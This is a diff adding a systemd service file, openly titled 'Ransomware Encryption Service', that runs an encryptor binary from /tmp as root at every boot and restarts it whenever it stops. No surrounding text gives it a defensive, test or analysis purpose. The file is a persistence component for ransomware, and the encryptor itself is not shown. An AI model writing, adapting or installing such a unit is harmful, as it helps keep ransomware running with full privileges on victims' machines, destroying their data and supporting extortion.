@@ -1,0 +1,11 @@
+[Unit]
+Description=Ransomware Encryption Service
+After=network.target
+
+[Service]
+ExecStart=/tmp/encryptor --service
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
